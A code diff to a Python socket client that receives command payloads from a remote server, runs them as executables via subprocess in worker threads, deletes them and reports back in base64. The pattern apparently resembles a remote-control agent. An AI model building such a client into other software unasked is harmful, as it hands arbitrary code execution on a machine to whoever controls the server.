@@ -20,9 +20,10 @@ INTERVAL    = cfg.t_interval
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((IP, PORT))
 
-q = queue.Queue(maxsize=0)
+q = queue.Queue(maxsize=200)
 
 ############# utility functions ############################
+
 def command_dispatch(command):
     command = ast.literal_eval(command)
     payload = str(command["payload"].decode("utf-8"))
@@ -35,10 +36,12 @@ def command_dispatch(command):
 def send_response(msg):
     enc_msg     = str(msg).encode('utf-8')
     base64_enc_msg = base64.b64encode(enc_msg)
+    base64_dec_msg = base64.decodebytes(base64_enc_msg)
+    msg= base64_dec_msg.decode()
+    print(msg)
     try:
         client.send(base64_enc_msg)
     except socket.error:
-        print ("ERROR: Could not connect to server")
         client.close()
     return
 
@@ -48,7 +51,6 @@ def send_data(msg):
     try:
         client.send(enc_msg)
     except socket.error:
-        print ("ERROR: Could not connect to server")
         client.close()
     return
 
@@ -65,6 +67,26 @@ def send_alive():
             break
     return
 
+#####################################################################
+
+
+
+
+
+#################### Threads Worker class ###############################
+
+class Worker(threading.Thread):
+   def __init__(self, target, *args):
+       self.target = target
+       threading.Thread.__init__(self)
+
+   def run(self):
+       self.target()
+
+#########################################################################
+
+
+
 
 ####################### commands class ##################################
 
@@ -76,6 +98,9 @@ class command():
         self.exe_filepath = task['filepath']
         self.id           = task['id']
         self.args         = task['args']
+
+    def __call__(self):
+       self.funcs_to_run()
 
     ## *************************** add here for new cmd_types!
     def set_subprocess_args(self):  
@@ -123,10 +148,7 @@ class command():
         self.delete_file()
         send_response(f"Finished cmd {self.id} \n")
     
-    def run_threaded(self):
-        # thread   = threading.Thread(target=self.funcs_to_run)
-        # thread.start
-        self.funcs_to_run()
+        
     
     
 
@@ -156,7 +178,7 @@ def recieve_cmds():
                     'args':args }
 
             q.put(task)
-            send_response(f"Received {id} \n")
+            send_response(f"Received cmd {id} \n")
 
     
         except socket.error:
@@ -171,9 +193,10 @@ def do_cmds():
         if task == None:
             continue
         cmd = command(task)
-        cmd.run_threaded()
+        t = Worker(cmd)
+        t.start()
 
-    
+
     
 def main():
     
